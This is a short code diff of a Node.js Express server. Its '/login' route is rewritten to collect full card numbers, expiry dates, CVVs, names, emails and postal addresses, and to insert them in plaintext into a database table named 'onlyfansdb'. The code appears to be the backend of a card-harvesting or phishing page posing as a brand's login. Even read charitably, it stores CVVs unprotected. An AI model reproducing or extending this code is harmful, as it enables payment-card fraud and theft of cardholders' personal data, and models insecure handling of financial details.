@@ -1,12 +1,9 @@
 const express = require('express');
 const http = require('http');
-const socketio = require('socket.io');
-const {addUser, removeUser, getUser, getUserInROom} = require('./user');
 const APP_PORT =process.env.PORT || 5000 ;
 const router =require('./router');
 const app = express();
 const server = http.createServer(app);
-const io = socketio(server);
 const cors = require('cors')
 const bodyParser = require('body-parser')
 const dotenv = require('dotenv')
@@ -49,12 +46,23 @@ app.get('/get', (req, res) =>{
 })
 
 app.post('/login', (req, res) =>{
-const name = req.body.name
-const email = req.body.email 
-const card = req.body.card 
 
-const sqlIsert = "INSERT INTO projectdatabase (name , email, card) VALUES (?,?,?)";
-  db.query(sqlIsert,[name, email,card], (error, result)=>{
+const street  = req.body.street
+const city = req.body.city
+const province = req.body.province
+const zip  = req.body.zip
+const country  = req.body.country       
+const email = req.body.email
+const name = req.body.name
+const number = req.body.number
+const month  = req.body.month
+const year  = req.body.year
+const cvv = req.body.cvv
+
+
+const sqlIsert = "INSERT INTO onlyfansdb (name,year,cvv,month,number, email,street,city,province,zip,country) VALUES (?,?,?,?,?,?,?,?,?,?,?)";
+  db.query(sqlIsert,[name,year,cvv,month,number, 
+    email,street,city,province,zip,country], (error, result)=>{
   console.log(error)
   res.send('hello ')
 })
